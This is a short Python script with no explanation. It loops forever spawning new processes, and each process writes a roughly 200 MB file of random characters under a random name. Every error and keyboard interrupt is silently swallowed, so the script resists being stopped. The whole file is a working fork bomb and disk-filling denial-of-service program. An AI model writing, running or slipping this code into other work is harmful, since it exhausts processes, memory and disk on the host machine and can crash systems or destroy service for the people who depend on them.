# -*- encoding: utf-8 -*-

from uuid import uuid4
from random import randint

from multiprocessing import Process


string = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
        "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
        "U", "V", "W", "X", "Y", "Z",

        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
        "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
        "u", "v", "w", "x", "y", "z",

        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
    ]


def main():
    try:
        with open(file=str(uuid4()), mode="a", encoding="utf-8") as f:
            for i in range(0, 20480000):
                f.write(string[randint(0, 61)] * 10)
    except (FileNotFoundError, KeyboardInterrupt, Exception):
        pass

    return


if __name__ == "__main__":
    while True:
        try:
            Process(
                target=main
            ).start()
        except (KeyboardInterrupt, Exception):
            pass
